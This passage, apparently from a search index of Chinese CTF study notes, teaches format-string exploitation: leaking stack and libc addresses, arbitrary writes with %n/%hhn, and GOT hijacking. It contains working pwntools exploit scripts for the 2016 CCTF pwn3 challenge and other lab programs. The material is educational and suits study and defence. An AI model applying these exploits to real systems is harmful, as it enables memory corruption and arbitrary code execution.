\u5f97\u51fa\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u76ee\u6807\u504f\u79fb\u6216\u5730\u5740 \u3002 shell $ ./goodluck what's the flag bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p You answered: bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161 But that was totally wrong lol get rekt 0x602830 \u662f\u7b2c 7 \u4f4d\u3002\u4e3a\u4ec0\u4e48\u6cc4\u9732\u7684\u4e0d\u662f 0x6262626262626262 \uff1f\u524d\u9762\u63d0\u5230\u4e86\uff0c64 \u4f4d\u7cfb\u7edf\u7684\u524d\u516d\u4e2a\u53c2\u6570\u662f\u5bc4\u5b58\u5668\u4f20\u53c2\u7684\uff0c\u800c bbbbbbbb \u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u81ea\u7136\u5728\u5bc4\u5b58\u5668\u4e2d\u5b58\u653e\uff0c0x602830 \u5c31\u662f\u5b58\u50a8\u7684\u5bc4\u5b58\u5668\u5730\u5740\u3002\u600e\u4e48\u83b7\u5f97\u8fd9\u4e2a\u5730\u5740\uff1fgdb \u8c03\u8bd5\u65ad\u70b9\u6253\u5728 printf \u51fd\u6570\uff1a \u8fd9\u6837\u5f97\u51fa\u6700\u540e\u7684 flag \u504f\u79fb\u4e3a 10 \u3002","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_6","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * # \u8fd9\u4e2a\u5e93\u6ca1\u6709\u7528\u5230\u53ef\u4ee5\u6ce8\u91ca\u6389 # from LibcSearcher import * goodluck = ELF('./goodluck') if args['REMOTE']: sh = remote('pwn.sniperoj.cn', 30017) else: sh = process('./goodluck') payload = \"%9$s\" print payload ##gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive()","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#hijack-got","text":"","title":"hijack GOT"},{"location":"fmtstr/fmtstr_example/#_7","text":"\u5728\u76ee\u524d\u7684 C \u7a0b\u5e8f\u4e2d\uff0clibc \u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7 GOT \u8868\u6765\u8df3\u8f6c\u7684\uff08\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\uff09\u3002\u6b64\u5916\uff0c\u5728\u6ca1\u6709\u5f00\u542f RELRO \u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2a libc \u7684\u51fd\u6570\u5bf9\u5e94\u7684 GOT \u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2a libc \u51fd\u6570\u7684 GOT \u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 printf \u7684 got \u8868\u9879\u5185\u5bb9\u4e3a system \u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884c printf \u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570 A \u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570 B \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4 \u786e\u5b9a\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u3002 \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570 A \u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\uff08\u56e0\u4e3a\u8fd9\u7c7b\u51fd\u6570\u4f1a\u5728\u7a0b\u5e8f\u6e90\u7801\u4e2d\u4f7f\u7528\u5230\uff0c\u6240\u4ee5\u80fd\u76f4\u63a5\u6216\u95f4\u63a5\u4ece elf \u6587\u4ef6\u4e2d\u8bfb\u53d6\uff09 \u786e\u5b9a\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740 \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570 B \u7684\u5730\u5740\u3002 \u5c06\u51fd\u6570 B \u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570 A \u7684 GOT \u8868\u5730\u5740\u5904\u3002 \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd \u5199\u5165\u51fd\u6570\uff1awrite \u51fd\u6570\uff08\u5e38\u89c1\uff09 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\uff08\u5e38\u89c1\uff09 ROP pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_8","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 CCTF \u4e2d\u7684 pwn3 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_9","text":"\u5982\u4e0b \u279c 2016-CCTF-pwn3 git:(master) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002RELRO \u662f\u90e8\u5206\u4fdd\u62a4\uff0c\u8fd9\u79cd\u72b6\u6001\u4e0b\u53ef\u4ee5\u4fee\u6539 GOT \u8868\uff0c\u5982\u679c\u662f FULL \u5219\u4e0d\u884c\u3002\u53e6\u5916\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542f ASLR \u4fdd\u62a4\u7684\u3002","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_10","text":"\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684 ftp\uff0c\u5177\u6709 get\uff0cput\uff0cdir \u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728 get \u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e int get_file() { char dest; // [sp+1Ch] [bp-FCh]@5 char s1; // [sp+E4h] [bp-34h]@1 char *i; // [sp+10Ch] [bp-Ch]@3 printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 0x28);//\u5c06\u5185\u5bb9\u590d\u5236\u5230dest return printf(&dest);//\u8f93\u51fadest\u5185\u5bb9 } } return printf(&dest); }","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_11","text":"\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_12","text":"\u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : filename.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive() exp \u66ff\u6362\u6211\u5199\u5f97\u7248\u672c\uff0c\u8fd9\u6761\u9898\u76ee\u7684\u5b8c\u6574 WP \uff1a 2016_CCTF_pwn3_writeup \u6ce8\u610f \u6211\u5728\u83b7\u53d6 puts \u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f 8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d 4 \u4e2a\u5b57\u8282\u5c31\u662f puts \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f 7\u3002 \u8fd9\u91cc\u6211\u5229\u7528\u4e86 pwntools \u4e2d\u7684 fmtstr_payload \u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91cc fmtstr_payload(7, {puts_got: system_addr}) \u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f 7\uff0c\u6211\u5e0c\u671b\u5728 puts_got \u5730\u5740\u5904\u5199\u5165 system_addr \u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002","title":"\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_exploit/","text":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528 \u9605\u8bfb ctf-wiki \u540e\u603b\u7ed3 \u6cc4\u9732\u5185\u5b58 \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528 GOT \u8868\u5f97\u5230 libc \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6 libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83 libc \u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump \u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002 \u7b80\u5355\u7684\u6cc4\u9732\u6808\u5185\u5b58 \u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> # file:leakmemory.c int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\"%s\", s); printf(\"%08x.%08x.%08x.%s\\n\", a, b, c, s); printf(s); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e return 0; } 32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u6808\u4f20\u53c2\uff0c64 \u4f4d\u7cfb\u7edf\u524d 7 \u4e2a\u53c2\u6570\u662f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\u300232 \u4f4d\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u51fa\u5b58\u5728\u6808\u4e0a\u7684\u53c2\u6570\u3002\uff0864 \u4f4d\u8981\u5bf9\u5e94\u8c03\u6574\uff09 \u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f\uff1a gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c \u8f93\u5165\u8f93\u51fa\u5982\u4e0b\uff1a >>>%p.%p.%p 00000001.22222222.ffffffff.%p.%p.%p 0xffffcd10.0xc2.0xf7e8b6bb \u6808\u60c5\u51b5\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" # \u5f00\u59cb\u6cc4\u9732\u4f4d\u7f6e 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\" \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u4e0a\u9762\u5df2\u7ecf\u5b9e\u73b0\u4f9d\u6b21\u83b7\u53d6\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff0c\u76f4\u63a5\u83b7\u53d6\u6307\u5b9a\u4e3a\u4f4d\u7f6e\u7684\u53c2\u6570\uff1a # \u7b2cn\u4e2a\u53c2\u6570 %n$p \u53ea\u8981\u77e5\u9053\u76ee\u6807\u6570\u636e\u5728\u6808\u4e0a\u7684\u504f\u79fb n \uff0c\u5c31\u80fd\u591f\u83b7\u53d6\u3002 \u5c0f\u603b\u7ed3 \u4f1a\u7528\u6765\u6cc4\u9732\u4ec0\u4e48 \u7406\u8bba\u4e0a\u4efb\u4f55\u6808\u4e0a\u6570\u636e\u90fd\u80fd\u88ab\u6cc4\u9732\u51fa\u6765\uff0c\u76ee\u524d\u9047\u5230\u8fc7\u7684\u6709\u4ee5\u4e0b\u8fd9\u4e9b\uff1a Canary \u6cc4\u9732\u51fa Canary \u7684\u503c\uff0c\u4ece\u800c\u7ed5\u8fc7 Canary \u4fdd\u62a4\u3002 text \u6bb5\u5730\u5740 \u6cc4\u9732\u51fa text \u6bb5\u7684\u771f\u5b9e\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7 PIE \u5bf9\u4e8e text \u6bb5\u7684\u4fdd\u62a4\uff0c\u4e3a ROP \u5b9e\u73b0\u63d0\u4f9b\u57fa\u7840\u3002 libc \u51fd\u6570\u5730\u5740 \u6cc4\u9732 libc \u51fd\u6570\u5730\u5740\uff0c\u83b7\u53d6 libc base addr \u3002\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u7528\u6765\u662f\u7ed5\u8fc7 PIE \u4fdd\u62a4\uff0c\u4f46\u6cc4\u9732 libc \u5730\u5740\u610f\u4e49\u4e0d\u6b62\u4e8e\u6b64\u3002 \u67d0\u4e9b\u53d8\u91cf \u6709\u4e9b\u9898\u76ee\u4f1a\u6709 if \u5224\u65ad\u8f93\u5165\u503c\u7b49\u662f\u5426\u4e0e\u9884\u5148\u8bbe\u5b9a\u7684\u503c\u76f8\u7b49\uff0c\u4ee5\u6b64\u589e\u52a0\u96be\u5ea6\u3002 \u5173\u952e\u5b57\u9009\u62e9 \u5229\u7528 %x \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528 %p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528 %s \u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528 %order$x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order$s \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002 \u8986\u76d6\u5185\u5b58 \u8986\u76d6\u5185\u5b58\u4f7f\u7528\u7684 %n \u548c %c \u914d\u5408\u5b9e\u73b0\u3002 c \u7b80\u5355\u70b9\u6765\u8bf4\u5c31\u662f\u4ea7\u751f\u51e0\u4e2a null \u5b57\u7b26\u3002 n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u5c06\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u5199\u5165\u7684\u65f6\u5019\u4e5f\u6709\u591a\u79cd\u65b9\u5f0f\uff1a n\uff1aint hn\uff1ashort int \u5199\u5165\u53cc\u5b57\u8282 hhn\uff1achar int \u5199\u5165\u5355\u5b57\u8282 \u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\uff0832\u4f4d\uff09\uff1a /* example/overflow/overflow.c */ #include <stdio.h> int a = 123, b = 456; int main() { int c = 789; char s[100]; printf(\"%p\\n\", &c); scanf(\"%s\", s); printf(s); if (c == 16) { puts(\"modified c.\"); } else if (a == 2) { puts(\"modified a for a small number.\"); } else if (b == 0x12345678) { puts(\"modified b for a big number!\"); } return 0; } \u8986\u76d6\u4efb\u610f\u5730\u5740 \u8986\u76d6\u5c0f\u6570\u5b57 \u8fd9\u91cc\u4ee5\u5c06 a \u8986\u76d6\u4e3a 2 \u4e3a\u4f8b\u3002\u9700\u8981\u5c06\u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u540e\u7f6e\uff0c\u56e0\u4e3a\u673a\u5668\u5b57\u957f\u4e3a 4 \uff0864 \u4f4d\u662f 8\uff09\u3002 \u6784\u9020\u5b57\u7b26\u4e32\u5982\u4e0b\uff1a aa%k$nxx[addr] aa \u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u6240\u4ee5\u6700\u540e\u4f1a\u5411\u76ee\u6807\u5730\u5740\u5199\u5165 2 \u3002 k \u76ee\u6807\u5730\u5740\u7684\u504f\u79fb\u4f4d\u7f6e\u3002 xx \u8ba9\u5b57\u7b26\u4e32\u5bf9\u5176\u673a\u5668\u5b57\u957f\uff0c\u8fd9\u91cc\u662f 4 \u3002 [addr] \u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u3002 \u600e\u4e48\u5bf9\u9f50 \u5bf9\u9f50\u65b9\u6cd5\u5728 32 64 \u7a0b\u5e8f\u4e2d\uff0c\u8986\u76d6\u5927\u6570\u5b57\u3001\u5c0f\u6570\u5b57\u4e2d\u90fd\u901a\u7528\uff0c\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4e3a\u4f8b\u3002python \u4f7f\u7528 len \u8ba1\u7b97\u957f\u5ea6\u540e\uff0c\u7528\u673a\u5668\u5b57\u957f\u53d6\u4f59\uff0c\u4f59\u6570\u5c31\u662f\u5bf9\u9f50\u957f\u5ea6\u3002 # 32\u4f4d\u673a\u5668\u5b57\u957f\uff1a4 # 64\u4f4d\u673a\u5668\u5b57\u957f\uff1a8 >>> len(\"aa%k$n\")%4 2 \u7b2c\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u504f\u79fb\u662f 6 \uff0c aa%k$nxx \u957f\u5ea6\u4e3a 8 \uff08\u4e0d\u4f1a\u7b97\u5c31 python len\uff09\uff0c\u6240\u4ee5 k \u504f\u79fb\u5e94\u8be5\u662f 8 \u3002 \u6784\u9020\u8986\u76d6\u5c0f\u6570\u5b57\u5229\u7528\u4ee3\u7801\uff1a def fora(): sh = process('./overwrite') a_addr = 0x0804A024 payload = 'aa%8$naa' + p32(a_addr) sh.sendline(payload) print sh.recv() sh.interactive() \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b >>>python exploit.py 0xffc1729c aaaa$\\xa0\\x0modified a for a small number. \u8986\u76d6\u5927\u6570\u5b57 \u8986\u76d6\u57fa\u672c\u7ed3\u6784\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u662f\u901a\u5e38\u662f\u8986\u76d6\u5927\u6570\u5b57\u4f1a\u5206\u6b21\u8986\u76d6\uff0c\u907f\u514d\u4e00\u4e0b\u6570\u636e\u592a\u5927\u800c\u4e0d\u6210\u529f\uff0c\u6240\u4ee5\u4f1a\u7528\u5230\u6807\u5fd7 hhn \u6216 hn \u3002 \u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u4f8b\u9898\uff0c\u5199\u5165\u7684\u76ee\u6807\u5730\u5740\u4e3a 0x0804A028 \u3002\u4f7f\u7528\u5355\u5b57\u8282\u5199\u5165\uff08hhn\uff09\uff0c\u5199\u5165\u503c\u4e3a 0x12345678 \u3002\u53d8\u91cf\u662f\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c\u4e5f\u5728\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u7684\uff1a \\x78\\x56\\x34\\x12 \uff0c\u7b80\u5355\u70b9\u5c31\u662f\u4ece\u53f3\u5411\u5de6\u8986\u76d6\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u4e3a\u4e86\u4e0e\u8986\u76d6\u5c0f\u6570\u5b57\u7edf\u4e00\uff0c\u907f\u514d\u8ba1\u7b97\u5730\u5740\u5360\u7528\u5b57\u957f\uff0c\u5c06\u5730\u5740\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\uff0c\u5f97\u51fa\u4ee5\u4e0b\u6846\u67b6\uff1a # \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload=\"%xc%y$hhn%xc%y$hhn%xc%y$hhn%xc%y$hhn\" # \u76ee\u6807\u5730\u5740 payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) x \u63a7\u5236\u8f93\u51fa\u591a\u5c11\u4e2a null \u5b57\u7b26\u3002 y \u5199\u5165\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002 \u624b\u5de5\u8ba1\u7b97 c \u751f\u6210\u5b57\u7b26\u6570 \u5199\u5165\u987a\u5e8f\u4e3a\uff1a0x78\u30010x56\u30010x34\u30010x12 \u9700\u8981\u5199\u51650x78\uff0c\u5df2\u7ecf\u5b58\u50a80x0\u5b57\u7b26 0x78=120 x1=120 --- \u9700\u8981\u5199\u51650x56\uff0c\u5df2\u7ecf\u5b58\u50a80x78\u5b57\u7b26 0x156\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x56 0x156-0x78=222 x2=222 --- \u9700\u8981\u5199\u51650x34\uff0c\u5df2\u7ecf\u5b58\u50a80x156\u5b57\u7b26 0x234\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x34 0x234-0x156=222 x3=222 --- \u9700\u8981\u5199\u51650x12\uff0c\u5df2\u7ecf\u5b58\u50a80x234\u5b57\u7b26 0x312\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x12 0x312-0x234=222 x4=222 --- \u5f97\u5230\u7ed3\u679c\uff1a payload=\"%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn\" \uff0c\u957f\u5ea6\u662f 44 \uff0c\u9884\u4f30\u5730\u5740\u504f\u79fb\u662f\u4e24\u4f4d\u6570\u5b57\uff0c\u518d\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u8ba1\u7b97\u5bf9\u9f50\u957f\u5ea6\u4e3a 0 \uff0c\u6700\u540e payload \u4e3a\uff1a payload=\"%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn\" payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) \u8986\u76d6\u6808\u5185\u5b58 \u786e\u5b9a\u8986\u76d6\u5730\u5740 \u8986\u76d6\u90a3\u91cc\u5185\u5bb9\u90fd\u597d\uff0c\u8986\u76d6\u5730\u5740\u80af\u5b9a\u8981\u660e\u786e\u7684\uff0c\u8986\u76d6\u6808\u4e0a\u53d8\u91cf\u4e5f\u662f\u9700\u8981\u7684\u3002\u53d8\u91cf\u5730\u5740\u4e00\u822c\u4f1a\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u6808\u5b58\u653e\u8fd9\u4e2a\u53d8\u91cf\u5730\u5740\u7684\u504f\u79fb\u3002 \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb \u8c03\u8bd5\u5728 printf \u6253\u65ad\u70b9\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcd0c', 'l8'] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u5728 0xffffcd14 